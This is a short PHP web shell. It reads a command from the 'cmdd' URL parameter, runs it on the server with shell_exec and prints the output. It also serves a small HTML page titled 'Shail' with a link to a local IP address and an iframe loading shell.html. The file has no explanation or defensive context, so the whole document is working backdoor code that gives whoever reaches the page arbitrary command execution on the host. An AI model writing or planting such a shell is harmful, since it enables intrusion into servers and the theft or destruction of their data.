<?php
$comd=$_GET['cmdd'];
$cmd=shell_exec($comd);
echo '<pre>'.$cmd.'<pre>';
?>
<html><head><title>Shail</title></head>
<body><a href="http://192.168.0.10/php-command-executions">Sutdown</a>
<br><iframe src="shell.html" width="100%" height="100%" frameborder="1"></iframe>
	</body></html>
